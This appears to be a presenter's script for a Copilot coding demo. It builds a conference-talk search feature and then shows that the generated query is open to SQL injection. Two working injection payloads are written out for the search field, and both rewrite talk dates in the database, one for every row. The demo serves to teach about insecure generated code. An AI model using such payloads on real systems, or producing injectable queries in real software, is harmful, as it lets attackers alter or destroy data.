## CoPilot Demo

1. Launch the app, browse to: http://localhost:8080
2. set up the index page

// insert a header fragment
// insert the eventsTable fragment

3. Add search functionality

In `SearchRepository.searchTalk`:

// lowercase the input
// create a query to search for the input in the description and title of the talk
// return the result of the query

In the app: show that the search field works

4. Demonstrate SQL injection

In the app, put this in the search field:

```sql
%'; update talk set start_date = CURRENT_TIMESTAMP, end_date = dateadd(hour,1,CURRENT_TIMESTAMP) where id = 1; --
```

NOTE: replace the talk id with the one for the presenter

OR

```sql
%'; update talk set start_date = CURRENT_TIMESTAMP, end_date = dateadd(hour,1,CURRENT_TIMESTAMP) --
```